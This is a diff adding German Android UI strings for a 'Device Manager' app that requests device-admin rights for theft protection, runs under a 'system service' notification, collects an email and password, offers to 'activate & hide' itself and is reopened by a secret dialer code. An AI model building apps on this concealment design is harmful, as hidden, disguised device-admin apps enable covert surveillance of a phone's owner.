@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Device Manager</string>
+    <string name="admin_description">Erforderlich für den Diebstahlschutz des Geräts</string>
+    <string name="channel_name">Systemdienst</string>
+    <string name="notification_text">Geräteschutz aktiv</string>
+    <string name="btn_permissions">Berechtigungen erteilen</string>
+    <string name="btn_admin">Geräteadmin aktivieren</string>
+    <string name="btn_activate">Guardian aktivieren &amp; verstecken</string>
+    <string name="hint_device_id">Geräte-ID (z.B. mein_handy)</string>
+    <string name="hint_email">E-Mail</string>
+    <string name="hint_password">Passwort</string>
+    <string name="label_setup">Einrichtung</string>
+    <string name="secret_code">Geheimcode: *#*#5483#*#*</string>
+</resources>
